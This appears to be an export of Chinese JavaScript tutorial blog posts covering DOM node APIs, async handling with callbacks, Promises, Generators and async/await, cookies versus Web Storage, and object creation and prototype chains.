HTMLCollection)转为数组，这样做的好处有两点： 1、因为这两个集合是动态的，转为数组可以创建当前集合的快照。 2、转为数组可以使用Array原型下的许多数组方法 将NodeList或HTMLCollection转为数组的方法有： Array.prototype.clice.call(list) // 或者 Array.prototype.concat.call(list) Array.from(list) 二、文档节点概述 节点类型：DOCUMENT_NODE —- 9 继承链： Object -&gt; EventTarget -&gt; Node -&gt; Document -&gt; HTMLDocument 示例：window.document 文档节点属性title12// 获取文档标题document.title referrer12// 获取提及者document.referrer URL12// 获取文档url连接地址document.URL lastModified12// 获取文档最后修改时间document.lastModified compatMode12// 获取兼容模式 BackCompat: 怪异模式，CSS1Compat: 严格模式document.compatMode doctype12// 取得 &lt;!DOCTYPE html&gt; 元素document.doctype documentElement12// 取得 &lt;html&gt; 元素document.documentElement head12// 取得 &lt;head&gt; 元素document.head links12// 取得所有 &lt;a&gt; 元素document.links links12// 取得文档的所有样式表document.styleSheets activeElement12// 取得文档中聚焦(获得焦点)的元素document.activeElement defaultView12// 获取顶部对象/全局对象，在浏览器中为 window，在其他JavaScript环境为该环境的顶部对象document.defaultView all12// HTML 文档中所有元素组成的集合document.all forms12// 文档中所有 &lt;form&gt; 元素组成的集合document.forms images12// 文档中所有的 &lt;img&gt; 元素组成的集合document.images scripts12// 文档中所有 &lt;script&gt; 元素组成的集合document.scripts 文档节点方法document.createElement(tagName) 描述：创建元素节点 参数： {String} tagName 要创建的元素名字 返回值： {Element} 创建的新元素 document.createTextNode(text) 描述：创建文本节点 参数： {String} text 文本内容，作为文本节点的 nodeValue 的值 返回值： {TEXT_NODE} 创建的新文本节点 document.createComment(text) 描述：创建注释节点 参数： {String} text 注释内容，作为注释节点的 nodeValue 的值 返回值： {COMMENT_NODE} 创建的新注释节点 document.createDocumentFragment() 描述：创建文档碎片 返回值： {DOCUMENT_FRAGMENT_NODE} 文档碎片 document.hasFocus() 描述： 判断当前文档是否获得焦点（切换浏览器tab页到其他页面，该方法即返回false） 返回值： {Boolean} true 代表文档获得焦点，false 代表没有获得焦点 document.getElementById(id) 描述：根据传入的id值匹配元素节点 参数： {String} id id值 返回值： {Element | null} 匹配则返回元素节点，否则返回 null document.elementFromPoint(x, y) 描述：获取文档上某一点最顶层的元素 参数： {Number} x 横坐标 {Number} y 纵坐标 返回值： {Element} 该点所在的最顶层元素 document.implementation.createHTMLDocument() 描述：创建一个当前文档之外的HTML文档 返回值： {Document} 文档引用 document.implementation.hasFeature(feature, version) 描述：探测浏览器是否支持指定版本的特性/模块 参数： {String} feature 特性名字 {Number} version 版本 可传参数如下： 12345678910111213141516171819| feature | version || ------------- | ------------- || Core | 1.0/2.0/3.0 || XML | 1.0/2.0/3.0 || HTML | 1.0/2.0 || Views | 2.0 || StyleSheets | 2.0 || CSS | 2.0 || CSS2 | 2.0 || Events | 2.0/3.0 || UIEvents | 2.0/3.0 || MouseEvents | 2.0/3.0 || MutationEvents| 2.0/3.0 || HTMLEvents | 2.0 || Range | 2.0 || Traversal | 2.0/3.0 || LS | 3.0 || LS-Async | 3.0 || Validation | 3.0 | 返回值： {Boolean} 支持则返回 true，否则返回 false 三、元素节点概述 节点类型：ELEMENT_NODE —- 1 继承链： Object -&gt; EventTarget -&gt; Node -&gt; Element -&gt; HTMLElement -&gt; HTML*Element -&gt; &lt;p&gt; 示例：document.querySelector(‘p’) 元素节点属性tagName 读写特性：只读 描述：获取元素的标签名，与 nodeName 值相同 attributes 读写特性：只读 描述：获取元素上 属性 和 值 的集合（NamedNodeMap） 123456正因为该集合为 NamedNodeMap 所以可以使用一下方法操作集合getNamedItem()setNamedItem()removeNamedItem()不推荐这种方式操作属性该属性的优势是所获取的集合是动态的，这样我们可以动态的知晓某元素上属性的数量 classList 读写特性：只读 描述：获取元素节点类属性和值的集合（类数组对象） 1234567el.classList.add(&apos;b&apos;) // 添加b类el.classList.remove(&apos;b&apos;) // 移除b类el.classList.toggle(&apos;b&apos;) // 切换b类el.classList.contains(&apos;b&apos;) // 判断el元素有没有b类el.classList.value // 返回值与 el.className 相同（类名被空格分隔的字符串）el.classList.length // el元素拥有类的数量注意：IE9不支持 classList dataset 读写特性：只读 描述：返回一个对象，包含元素所有以 data-* 起始的属性 data-a-a 将要这样访问： el.dataset.aA (即转为驼峰)，可以使用 delete 语句删除一个data属性，另外IE9不支持该属性，可以使用 getAttribute/setAttribute/removeAttribute/hasAttribute 代替 元素节点方法getAttribute(attrName) 描述：获取元素节点上某一个属性的值 参数： {String} attrName 属性名字 返回值： {String} 属性值 setAttribute(attrName, attrValue) 描述：获取元素节点上某一个属性的值 参数： {String} attrName 属性名字 {String} attrValue 属性值 removeAttribute(attrName) 描述：移除调用该方法的元素节点的某一属性 参数： {String} attrName 属性名字 hasAttribute(attrName) 描述：判断元素是否有某一特定属性 参数： {String} attrName 属性名字 返回值： {Boolean} true 有，false 没有 因为 hasAttribute() 方法可以为布尔值型属性取得布尔值反馈，所以可以用来判断单选框复选框是否被选中 querySelector(selector) 描述：根据css选择器返回第一个匹配的节点 参数： {String} selector css选择器，支持css3 返回值： {Element | Null} 匹配的元素节点 或 null 除了 document.querySelector() 外，还可以在指定元素下使用该方法 el.querySelector() querySelectorAll(selector) 描述：根据css选择器匹配并返回符合的节点集合 参数： {String} selector css选择器，支持css3 返回值： {Array} 匹配的元素节点 或 null 注意：querySelectorAll() 方法返回的节点集合是创建时文档的快照，并不是实时动态的。而 getElementsByTagName 和 getElementsByClassName 返回的节点集合则是动态的加特技：除了 document.querySelectorAll() 外，还可以在指定元素下使用该方法 el.querySelectorAll() getElementsByClassName(className) 描述：根据class值匹配并返回节点集合 参数： {String} className class值 返回值： {节点集合} 节点集合 除了 document.getElementsByClassName() 外，还可以在指定元素下使用该方法 el.getElementsByClassName() getElementsByTagName(tagName) 描述：根据class值匹配并返回节点集合 参数： {String} tagName 标签名 返回值： {节点集合} 节点集合 除了 document.getElementsByTagName() 外，还可以在指定元素下使用该方法 el.getElementsByTagName() getElementsByName(name) 描述：根据元素 name 属性值匹配并返回节点集合 参数： {String} name 元素 name 属性值 返回值： {节点集合} 节点集合 normalize() 描述： 合并调用该方法元素的多个子文本节点为一个子文本节点，其后代元素节点下的子节点也会被合并，注意，只有两个文本子节点相邻是才会被合并 几何量 与 滚动几何量属性offsetParent 读写特性：只读 描述：获取定位父级 offsetParent 的取值规则： 1231、按照DOM树向上查找离调用该属性的元素最近的position属性不为static的祖先元素2、如果没有找到，那么&lt;body&gt;元素就是 offsetParent 的值3、如果在查询过程中，碰到 &lt;td&gt; &lt;th&gt; &lt;table&gt; 标签，那么 offsetParent 就为这些值 offsetTop 读写特性：读写 描述： 读：获取元素边框外沿 到 其定位父级边框内沿 的上距离 写：设置元素边框外沿 到 其定位父级边框内沿 的上距离 offsetLeft 读写特性：读写 描述： 读：获取元素边框外沿 到 其定位父级边框内沿 的左距离 写：设置元素边框外沿 到 其定位父级边框内沿 的左距离 offsetHeight 读写特性：只读 描述：获取元素高 （边框 + 填充 + 内容） offsetWidth 读写特性：只读 描述：获取元素宽 （边框 + 填充 + 内容） clientHeight 读写特性：只读 描述：获取元素的高 （填充 + 内容） clientWidth 读写特性：只读 描述：获取元素的宽 （填充 + 内容） scrollHeight 读写特性：只读 描述：获取滚动元素的高度 注意：如果滚动区域内的子节点比滚动区域小，那么该属性返回滚动区域的高度 scrollWidth 读写特性：只读 描述：获取滚动元素的宽度 注意：如果滚动区域内的子节点比滚动区域小，那么该属性返回滚动区域的宽度 scrollTop 读写特性：读写 描述： 读：获取滚动元素当前已滚动的区域距离上边的距离 写：使用JavaScript以编程的方式滚动元素到指定的距离 scrollLeft 读写特性：读写 描述： 读：获取滚动元素当前已滚动的区域距离左边的距离 写：使用JavaScript以编程的方式滚动元素到指定的距离 方法getBoundingClientRect() 描述：获取元素相对于整个页面的位置（top/right/bottom/left），以及元素的宽高 返回值： {Object} 元素位置信息 12345678&#123; top right bottom left width height&#125; 加特技：返回值中，width 和 height 为元素 （边框 + 填充 + 内容）的高度和宽度，与调用元素的 offsetHeight 与 offsetWidth 属性的返回值相同 scrollIntoView(position) 描述：滚动调用该方法的元素到滚动元素的视区 参数： {Boolean} position true 滚动该元素到视区顶部，false 滚动该元素到视区底部。默认为 true 四、文本节点概述 节点类型：TEXT_NODE —- 3 继承链： Object -&gt; EventTarget -&gt; Node -&gt; CharacterData -&gt; Text -&gt; ‘asdfasdg’ 文本节点属性length 描述：文本节点拥有length属性，返回该节点文本内容的长度 data 描述：返回文本节点的字符串内容 与 nodeValue 的值相同 nodeValue 描述：与 data 属性的值相同 文本节点方法appendData(text) 描述：将text追加到节点末尾 参数： {String} text 要追加的字符串 insertData(offset, text) 描述：在 offset 指定的位置前插入字符串 text 参数： {Number} offset 位置 {String} text 要追加的字符串 deleteData(offset, count) 描述：在 offset 指定的位置开始，删除 count 个字符，包括 offset 位置 参数： {Number} offset 位置 {Number} count 删除字符的数量 replaceData(offset, count, text) 描述：使用字符串 text 替换从 offset 指定的位置开始 count 个字符，包括 offset 位置 参数： {Number} offset 位置 {Number} count 删除字符的数量 {String} text 字符串 substringData(offset, count) 描述：获取从 offset 指定的位置开始 count 个字符，包括 offset 位置 参数： {Number} offset 位置 {Number} count 获取字符的数量 返回值： {String} 获取到的字符串 splitText(offset) 描述：从 offset 指定的位置将调用该方法的文本节点分割成两个文本节点 参数： {Number} offset 分割的位置，该位置将包含在后一个文本节点中 返回值： {TEXT_NODE} 后一个文本节点的内容。 五、CSS 样式 与 样式表CSS 样式元素的内联样式(style 属性)12345678910// 访问元素的 style 属性[el.style]，将返回 CSSStyleDeclaration 对象，仅包含该元素的内联样式，而不是计算后样式el.style.驼峰属性名el.style.setProperty('css属性', '值')el.style.getProperty('css属性')el.style.removeProperty('css属性')// 使用一个由一系列css属性和值的字符串设置style的值// 例：el.style.cssText = "width: 200px; height: 200px; background: red;"el.style.cssText 获取元素的计算后样式 window.getComputedStyle(element) 描述：获取元素计算后的样式 参数： {Element} element 元素 返回值： {CSSStyleDeclaration} 包含元素属性键值对的对象 与 el.style 一样，返回 CSSStyleDeclaration 对象，但不同的是，使用 getComputedStyle 获得的 CSSStyleDeclaration 对象下的属性时只读的，而通过 style 属性获得的 CSSStyleDeclaration 是可设置的。另外，getComputedStyle 获得的颜色值始终都是 rgb() 格式，而通过style获得的颜色值就是你再内敛样式中所写的样子，并且在通过 getComputedStyle 获取的 transform 属性值为矩阵 matrix 12345window.getComputedStyle()作用：使用 window.getComputedStyle(el) 可以获取元素计算后的样式一个参数：元素返回值：与 el.style 一样，返回 CSSStyleDeclaration 对象，但不同的是，使用 getComputedStyle 获得的 CSSStyleDeclaration 对象下的属性时只读的，而通过 style 属性获得的 CSSStyleDeclaration 是可设置的。另外，getComputedStyle 获得的颜色值始终都是 rgb() 格式，而通过style获得的颜色值就是你再内敛样式中所写的样子，并且在通过 getComputedStyle 获取的 transform 属性值为矩阵 matrix CSS样式表 与 CSS规则CSS样式表使用 &lt;link&gt; 和 &lt;style&gt; 标签可以分别创建 外部 和 内部 样式表，一旦样式表被添加到HTML文档中，每个样式表将表示为一个 CSSStyleSheet 对象。该对象可以通过 &lt;link&gt; 或 &lt;style&gt; 标签元素的 sheet 属性访问： el.sheet CSS规则每个样式表都是由一条条规则组成的(如：body{background-color: red; 为一条规则)，CSS规则表示为一个 CSSStyleRule 对象，可以通过 el.sheet.cssRules[n] 或者 el.sheet.rules[n] 访问该样式表的第 n 条规则 访问所有样式表可以使用 document.styleSheets 访问该文档的所有样式表，该属性返回由 CSSStyleSheet 对象组成的 StyleSheetList 对象 六、DOM中的JavaScriptJavaScript默认是同步解析的当DOM在解析时遇到 &lt;script&gt; 标签，将停止解析文档，并执行JavaScript脚本，如果是外部脚本，必须要下载后再解析，这将导致性能问题。 defer可以使用 defer 属性推迟外部脚本的下载与执行，直到html文档解析完成。 async使用 async 属性异步下载并执行外部JavaScript文件 不会阻塞DOM的解析与其他资源(如：图片、样式表)的下载 如果有多个外部JavaScript脚本拥有 async 属性，那么他们的执行顺序很可能不按照DOM中的顺序执行。先下载完的先执行 如果一个 &lt;script&gt; 元素同时存在 defer 和 async ，async 的优先级高 注意：使用JavaScript动态创建的 &lt;script&gt; 元素，并添加到DOM，那么该脚本将强制按照 async 的规则下载与执行 通过 &lt;script&gt; 元素的 onload、onerror、load、error 等事件，可以监听异步下载的JavaScript的下载情况]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>DOM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA-异步处理]]></title>
    <url>%2F2018%2F04%2F17%2FECMA_%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[异步处理案例简介主流的异步处理方案主要有：回调函数(CallBack)、Promise、Generator函数、async/await。这一小节，我们通过一个小例子，对比这几种异步处理方案的不同。 回调函数(CallBack)假设我们有一个 getData 方法，用于异步获取数据，第一个参数为请求的 url 地址，第二个参数是回调函数，如下： 123456789101112function getData(url, callBack) &#123; // 模拟发送网络请求 setTimeout(() =&gt; &#123; // 假设 res 就是返回的数据 let res = &#123; url: url, data: Math.random() &#125;; // 执行回调，将数据作为参数传递 callBack(res); &#125;, 1000);&#125; 我们预先设定一个场景，假设我们要请求三次服务器，每一次的请求依赖上一次请求的结果，如下： 123456789getData('/page/1?param=123', (res1) =&gt; &#123; console.log(res1); getData(`/page/2?param=$&#123;res1.data&#125;`, (res2) =&gt; &#123; console.log(res2); getData(`/page/3?param=$&#123;res2.data&#125;`, (res3) =&gt; &#123; console.log(res3); &#125;); &#125;);&#125;); 通过上面的代码可以看出，第一次请求的 url 地址为：/page/1?param=123，返回结果为 res1。 第二个请求的 url 地址为：/page/2?param=${res1.data}，依赖第一次请求的 res1.data，返回结果为 res2。 第三次请求的 url 地址为：/page/3?param=${res2.data}，依赖第二次请求的 res2.data，返回结果为 res3。 由于后续请求依赖前一个请求的结果，所以我们只能把下一次请求写到上一次请求的回调函数内部，这样就形成了常说的：回调地狱。 使用 PromisePromise 就是为了解决回调地狱的问题，为异步编程提供统一接口而提出的，最早有社区实现，由于ES6的原因，现在 Promise 已经是语言基础的一部分了。 现在我们使用 Promise 重新实现上面的案例，首先，我们要把异步请求数据的方法封装成 Promise ： 1234567891011function getDataAsync(url) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; let res = &#123; url: url, data: Math.random() &#125;; resolve(res); &#125;, 1000); &#125;);&#125; 那么请求的代码应该这样写： 123456789101112getDataAsync('/page/1?param=123').then(res1 =&gt; &#123; console.log(res1); return getDataAsync(`/page/2?param=$&#123;res1.data&#125;`);&#125;).then(res2 =&gt; &#123; console.log(res2); return getDataAsync(`/page/3?param=$&#123;res2.data&#125;`);&#125;).then(res3 =&gt; &#123; console.log(res3);&#125;); then 方法返回一个新的 Promise 对象，then 方法的链式调用避免了 CallBack 回调地狱。但也并不是完美，比如我们要添加很多 then 语句，每一个 then 还是要写一个回调。如果场景再复杂一点，比如后边的每一个请求依赖前面所有请求的结果，而不仅仅依赖上一次请求的结果，那会更复杂。为了做的更好，async/await 就应运而生了，来看看使用 async/await 要如何实现。 async/awaitgetDataAsync 方法不变，如下： 1234567891011function getDataAsync(url) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; let res = &#123; url: url, data: Math.random() &#125;; resolve(res); &#125;, 1000); &#125;);&#125; 业务代码如下： 12345678async function getData() &#123; let res1 = await getDataAsync('/page/1?param=123'); console.log(res1); let res2 = await getDataAsync(`/page/2?param=$&#123;res1.data&#125;`); console.log(res2); let res3 = await getDataAsync(`/page/2?param=$&#123;res2.data&#125;`); console.log(res3);&#125; 对比 Promise 感觉怎么样？是不是非常清晰，但是 async/await 是基于 Promise 的，因为使用 async 修饰的方法最终返回一个 Promise，实际上，async/await 可以看做是使用 Generator 函数处理异步的语法糖，我们来看看如何使用 Generator 函数处理异步。 Generator首先异步函数依然是： 1234567891011function getDataAsync(url) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; let res = &#123; url: url, data: Math.random() &#125;; resolve(res); &#125;, 1000); &#125;);&#125; 使用 Generator 函数可以这样写： 12345678function* getData() &#123; let res1 = yield getDataAsync('/page/1?param=123'); console.log(res1); let res2 = yield getDataAsync(`/page/2?param=$&#123;res1.data&#125;`); console.log(res2); let res3 = yield getDataAsync(`/page/2?param=$&#123;res2.data&#125;`); console.log(res3);&#125; 然后我们这样逐步执行： 12345678let g = getData();g.next().value.then(res1 =&gt; &#123; g.next(res1).value.then(res2 =&gt; &#123; g.next(res2).value.then(() =&gt; &#123; g.next(); &#125;); &#125;);&#125;); 上面的代码，我们逐步调用遍历器的 next() 方法，由于每一个 next() 方法返回值的 value 属性为一个 Promise 对象，所以我们为其添加 then 方法，在 then 方法里面接着运行 next 方法挪移遍历器指针，直到 Generator 函数运行完成，实际上，这个过程我们不必手动完成，可以封装成一个简单的执行器： 1234567891011121314function run(gen) &#123; let g = gen(); function next(data) &#123; let res = g.next(data); if (res.done) return res.value; res.value.then((data) =&gt; &#123; next(data); &#125;); &#125; next();&#125; run 方法用来自动运行异步的 Generator 函数，其实就是一个递归的过程调用的过程。这样我们就不必手动执行 Generator 函数了。有了 run 方法，我们只需要这样运行 getData 方法： 1run(getData) 这样，我们就可以把异步操作封装到 Generator 函数内部，使用 run 方法作为 Generator 函数的自执行器，来处理异步。其实我们不难发现，async/await 方法相比于 Generator 处理异步的方式，有很多相似的地方，只不过 async/await 在语义化方面更加明显，同时 async/await不需要我们手写执行器，其内部已经帮我们封装好了，这就是为什么说 async/await 是 Generator 函数处理异步的语法糖了。]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>异步处理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA-cookie和storage]]></title>
    <url>%2F2018%2F04%2F17%2FECMA_cookie%E5%92%8Cstorage%2F</url>
    <content type="text"><![CDATA[cookie 详谈概述cookie 最初被设计用来存储回话信息。 我们知道 HTTP 是一种无状态的请求响应，即每次请求响应之后连接会立即或延时(保持一定的有效期)断开。下一次请求再重新建立连接，那么服务器如何知道你是上一次的那个连接？这个时候就需要一种方式，告诉服务器你的身份信息，cookie 就是来做这件事的。 cookie 用来跟踪会话信息，第一次响应设置 cookie，以后的每次请求都会发送该 cookie。 Set-Cookie 响应头具体流程是： 对于一个 HTTP 请求，服务器可以通过 Set-Cookie 响应头设置 cookie： 123HTTP/1.1 200 OKSet-Cookie: key=val... 上面的响应头中，设置了名字为 key，值为 val 的cookie，这里需要注意的是，key 和 val 必须是 URL 编码的(encodeURIComponent)。在随后的请求中，浏览器通过在请求头中添加 Cookie 字段，携带信息给服务器： 123GET /index.html HTTP/1.1Cookie: key=val... Cookie 的限制跨域的限制受同源策略的保护和限制，cookie 是绑定在特定的域名下的，这个限制一定程度上保护了 cookie 中的信息不回被其他域使用。 数量和大小的限制cookie 是存在浏览器中的，如果一个 cookie 不是会话cookie，那么就要保存在磁盘中。这个时候，我们需要对 cookie 所能够存储的数据量进行限制，否则恶意的存储会撑爆用户的磁盘，这个限制是从数量和大小两个维度上定义的： 数量的限制数量限制是对于每个域而言的： IE6限制每个域 20 个cookie IE7限制每个域最多 50 个cookie Firefox限制每个域最多 50 个cookie Opera限制每个域最多 30 个cookie Safari 和 Chrome 没有明确硬性规定 如果设置的 cookie 超过数量限制，各个浏览器的行为不同，有的会清空最早设置的cookie腾出空间，有的则会删除最近最少使用(LRU)的cookie腾出空间 大小的限制大多数浏览器限制整个 cookie 的长度大约为 4096B，即4KB。大小限制是针对所有cookie，而非单个cookie。 Cookie 的结构如下图： 上图中展示了响应头的 Set-Cookie 字段中设置cookie的所有可选的标志： 名称cookie 的名称，cookie的名称是不区分大小写的，但是由于服务器在处理 cookie 的时候，可能会区分大小写，所以实践中，我们最好区分大小写。 注意：cookie名称必须是URL编码的 值存储在相应名称下的字符串值，该值也是URL编码的。 域 - domain指定cookie是对于哪个域有效的。 可以是子域(www.example.com)，也可不是(.example.com)，如果是主域，那么该cookie对所有子域都有效。 路径 - path指定一个域下的一个路径，cookie 只对该路径有效。 例如：path=/books/，假设域为：www.example.com，那么cookie只有 www.example.com/books/ 才能访问，而 www.example.com 则不能。 过期时间 - expires表示cookie如何被删除。默认情况下，浏览器回话结束时会删除所有cookie，不过可以通过 expires 字段手动设置失效时间，expires 字段的值为 GMT 格式的日期字符串。 在 js 中，可以使用如下代码获取 GMT 格式的日期字符串： 1new Date().toGMTString() 安全标志 - secure指定后，cookie 只有使用 SSL 连接的时候才会发送给服务器。 HttpOnly 标志指定后，cookie只能用于http层面，不能被客户端脚本读取。 以上字段中，只有名称和值是必须的 Cookie 操作的封装使用 JavaScript 操作cookie，即操作 document.cookie 属性，这个属性设计的并不友好，这已经是众所周知的事实….. 当通过 document.cookie 获取 cookie 的时候，它返回一个字符串，包含所有可用的cookie信息，这个字符串又等号和分号分隔： 1key1=val1;key2=val2;key3=val3 其中，名称和值都是URL编码的，所以要通过 decodeURIComponent 解码。 当通过 document.cookie 设置值时，你要设置一个字符串，这个字符串与 Set-Cookie 响应头的格式一样，由分号和空格分隔。 设置 document.cookie 并不会覆盖cookie，除非设置的cookie已经存在。而会解析字符串，将你设置的cookie添加到已存在的cookie集合中。 需要注意的是，在设置cookie的时候，名称和值也是需要URL编码的。 为了更直观和方便的操作cookie，我们通常封装对 document.cookie 的操作，下面的代码来自《JavaScript高程》，并做了相应的修改： 12345678910111213141516171819202122232425262728293031323334353637383940let cookieUtil = &#123; get: function (name) &#123; let cookieName = encodeURIComponent(name) + '=', cookieStart = document.cookie.indexOf(cookieName), cookieValue = null; if (cookieStart &gt; -1) &#123; let cookieEnd = document.cookie.indexOf(';', cookieStart); if (cookieEnd === -1) &#123; cookieEnd = document.cookie.length; &#125; cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd)); &#125; return cookieValue; &#125;, set: function (name, value, expires, domain, path, secure, HttpOnly) &#123; let cookieText = encodeURIComponent(name) + '=' + encodeURIComponent(value); if (expires instanceof Date) &#123; cookieText += '; expires=' + expires.toGMTString(); &#125; if (path) &#123; cookieText += '; path=' + path; &#125; if (domain) &#123; cookieText += '; domain=' + domain; &#125; if (secure) &#123; cookieText += '; secure'; &#125; if (HttpOnly) &#123; cookieText += '; HttpOnly'; &#125; document.cookie = cookieText; &#125;, unset: function (name, domain, path, secure, HttpOnly) &#123; this.set(name, '', new Date(0), domain, path, secure, HttpOnly); &#125;&#125;; cookie 与 sessionStorage 和 localStorage 的区别区别数据的生命周期cookie 可以设置失效时间，默认是关闭浏览器后失效 sessionStorage 仅在当前回话下有效，关闭标签或浏览器后失效 localStorage 除非手动清除，否则永久保存 存储数据的大小cookie 在 4kb 左右 sessionStorage 和 localStorage 在 5MB 左右，因浏览器而异 与服务器端通讯cookie 会被携带在HTTP的请求头中，所以用cookie存储太多数据会带有性能问题 sessionStorage 和 localStorage 仅存在客户端，不参与服务器通讯 正因为 cookie 会参与服务器通讯，所以 storage 是不能取代 cookie 的，因为cookie是HTTP协议的一部分 易用性cookie 的原生接口不友好，需要手动封装读写操作 storage 的原生接口还是可以接受的 注意storage在存储数据的时候，都是以字符串的形式进行保存的，所以无论你存储的是数字类型还是对象类型，当你读取的时候，你得到的将是该数据的字符串表示 封装cookie 的增删改查cookie 的操作是对 document.cookie 的封装，前面我们已经讲过了。 storage 的增删改查曾： 123localStorage.age = 24// 等价于localStorage.setItem('age', 24) 查： 123localStorage.age// 等价于localStorage.getItem('age') 改： 修改类似于增加，在原有的 key 上重新设置值就可以了 123localStorage.age = 24// 修改localStorage.age = 30 删： 删除全部存储的内容 1localStorage.clear() 删除某个键值 1localStorage.removeItem('age') 获取对应索引的键值： 1localStorage.key(index)]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>cookie</tag>
        <tag>storage</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA_对象]]></title>
    <url>%2F2018%2F04%2F17%2FECMA_%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[js对象详解(JavaScript对象深度剖析，深度理解js对象) 创建对象 proto与prototype 继承与原型链 对象的深度克隆 一些Object的方法与需要注意的点 ES6新增特性 创建对象 字面量的方式：1var myHonda = &#123;color: "red", wheels: 4, engine: &#123;cylinders: 4, size: 2.2&#125;&#125; 就是new Object()的语法糖，一样一样的。 工厂模式：1234567891011function createCar() &#123; let oTemp = new Object(); oTemp.name = arguments[0]; //直接给对象添加属性，每个对象都有直接的属性 oTemp.age = arguments[1]; oTemp.showName = function () &#123; alert(this.name); &#125;;//每个对象都有一个 showName 方法版本 return oTemp;&#125;let myHonda = createCar('honda', 5); 只是给new Object()包了层皮，方便量产，并没有本质区别，姑且算创建对象的一种方式。 构造函数：12345678910function Person(name, age, sex) &#123; this.name = name; this.age = age; this.sex = sex; this.getName = function () &#123; return this.name; &#125;;&#125;let rand = new Person('Rand McKinnon', 33, 'M'); 上面构造函数的getName方法，每次实例化都会新建该函数对象，还形成了当前情况下并没有卵用的闭包，所以构造函数添加方法用下面的方式处理，工程模式给对象添加方法的时候也应该用下面的方式避免重复构造函数对象。12345678910function Person(name, age, sex) &#123; this.name = name; this.age = age; this.sex = sex; this.getName = getName;&#125;function getName() &#123; return this.name;&#125; 构造函数创建对象的过程和工厂模式又是半斤八两，相当于隐藏了创建新对象和返回该对象这两步，构造函数内this指向新建对象，没什么不同1234// new的过程let obj = &#123;&#125;;obj.__proto__ = Person.prototype;Person.call(obj); 最大的不同：构造函数创造出来的对象constructor属性指向该构造函数，工程模式指向function Object() {...}。构造函数相当于给原型链上加了一环，构造函数有自己的 prototype，工厂模式就是个普通函数。说到这儿我上一句话出现了漏洞，工厂模式的 constructor 指向哪得看第一句话 new 的是什么。构造函数直接调用而不 new 的话，就看调用时候 this 指向谁了，直接调用就把属性绑到 window 上了，通过 call 或者 apply 绑定到其他对象作用域就把属性添加到该对象了。 原型模式构造函数虽然在原型链上加了一环，但显然这一环啥都没有啊，这样一来和工厂模式又有什么区别？加了一环又有什么意义？原型模式浮出水面1234567891011121314151617181920212223function Car() &#123;&#125;//用空构造函数设置类名Car.prototype.color = 'blue';// 每个对象都共享相同属性Car.prototype.doors = 3;Car.prototype.drivers = new Array('Mike', 'John');Car.prototype.showColor = function () &#123; alert(this.color);&#125;;// 每个对象共享一个方法版本，省内存。// 构造函数的原型属性可以通过字面量来设置，别忘了通过 Object.defineProperty()设置 constructor 为该构造函数function Car() &#123;&#125;Car.prototype = &#123; color: 'blue', doors: 3, showColor: function () &#123; alert(this.color); &#125;&#125;;Object.defineProperty(Car.prototype, 'constructor', &#123;enumerable: false, value: Car&#125;);// (不设置 constructor 会导致 constructor 不指向构造函数，直接设置 constructor 会导致 constructor 可枚举) 使用原型模式注意动态性，通过构造函数实例化出的对象，他的原型对象是构造函数的 prototype ，如果在他的原型对象上增加或删除一些方法，该对象会继承这些修改。例如，先通过构造函数 A 实例化出对象 a ，然后再给 A.prototype 添加一个方法，a 是可以继承这个方法的。但是给 A.prototype 设置一个新的对象，a 是不会继承这个新对象的属性和方法的。听起来有点绕，修改 A.prototype 相当于直接修改 a 的原型对象，a 很自然的会继承这些修改，但是重新给 A.prototype 赋值的话，修改的是构造函数的原型，并没有影响 a 的原型对象！a 被创建出来以后原型对象就已经确定了，除非直接修改这个原型对象(或者这个原型对象的原型对象)，否则 a 是不会继承这些修改的！ Object.create()传入要创建对象实例的原型对象，和原型模式几乎是一个意思也是相当于在原型链上加了一环，区别在于这种方式创建的对象没有构造函数。这种方式相当于：1234567function object(o) &#123; function F() &#123; &#125; F.prototype = o; return new F();&#125; 相当于构造函数只短暂的存在了一会，创建出来的对象的constructor指向原型对象o的constructor 混合模式使用原型模式时，当给实例对象设置自己专属的属性的时候，该实例对象会忽略原型链中的该属性。但当原型链中的属性是引用类型值的时候，操作不当有可能会直接修改原型对象的属性！这会影响到所有使用该原型对象的实例对象！大部分情况下，实例对象的多数方法是共有的，多数属性是私有的，所以属性在构造函数中设置，方法在原型中设置是合适的，构造函数与原型结合使用是通常的做法。还有一些方法，无非是工厂模式与构造函数与原型模式的互相结合，在生成过程和 this 指向上做一些小变化。 class方式：es6见下面 ES6 class 部分，只是一个语法糖，本质上和构造函数并没有什么区别，但是继承的方式有一些区别。 __proto__和prototype这两个到底什么关系？ 首先要明白js存在两种对象。 1、实例对象2、函数对象 所有实例对象都有一个__proto__属性，所有函数对象都有prototype属性。所有的实例对象都是通过构造函数创建出来的。__proto__指向创建该实例对象的构造函数的prototype属性。prototype属性也是一个实例对象，也存在__proto__属性，它指向更高一级的构造函数prototype，最终Object.prototype.__proto__指向null，原型链结束。实例对象的__proto__是浏览器的实现，并没有在ECMA标准中，可以用constructor.prototype代替。 这里感觉很乱，用一张图看吧 继承和原型链当访问一个对象的属性时，如果在对象本身找不到，就会去搜索对象的原型，原型的原型，知道原型链的尽头null，那原型链的怎么连起来的呢？把实例对象 函数对象 原型对象视为一个小组，上面说了三者之间的关系，构造函数是函数，可实例对象和原型对象都是普通对象啊，这样就出现了这样的情况：这个小组的原型对象，等于另一个小组实例对象，而此小组的原型对象有可能是其他小组的实例对象，这样一个个的小组不就连接起来了吗。举个例子12345678910function Super() &#123; this.val = 1; this.arr = [1];&#125;function Sub() &#123; // ...&#125;Sub.prototype = new Super(); Sub是一个小组，Super是一个小组，Sub的原型对象链接到了Super的实例对象。基本上所有对象顺着原型链爬到头都是Object.prototype，而Object.prototype就没有原型对象，原型链就走到头了。 